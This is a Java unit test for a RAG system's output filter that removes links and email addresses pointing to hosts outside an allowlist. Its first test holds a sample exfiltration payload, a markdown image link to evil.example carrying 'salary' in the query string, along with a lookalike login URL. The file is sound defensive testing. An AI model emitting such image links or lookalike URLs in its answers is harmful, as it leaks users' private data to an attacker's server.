package dev.acme.rag.security;

import static org.junit.jupiter.api.Assertions.*;

import java.util.List;
import java.util.Set;

import org.junit.jupiter.api.Test;

class OutputGuardTest {
    final OutputGuard guard = new OutputGuard(Set.of("acme.example"));

    @Test void removesExfiltrationImageLinksAndEmails() {
        var r = guard.apply("Done. ![status](http://evil.example/t?q=salary) Mail finance-help@evil.example or see http://evil.example/login");
        assertEquals(List.of("![status](http://evil.example/t?q=salary)", "http://evil.example/login", "finance-help@evil.example"), r.removed());
        assertFalse(r.text().contains("evil.example"));
    }

    @Test void keepsAllowlistedHosts() {
        var r = guard.apply("Policy: https://acme.example/expenses, contact hr@acme.example");
        assertTrue(r.removed().isEmpty());
        assertEquals("Policy: https://acme.example/expenses, contact hr@acme.example", r.text());
    }

    @Test void hostMatchIsExactNotSuffix() { // acme.example.evil.example must not pass as acme.example
        assertEquals(1, guard.apply("https://acme.example.evil.example/x").removed().size());
    }
}
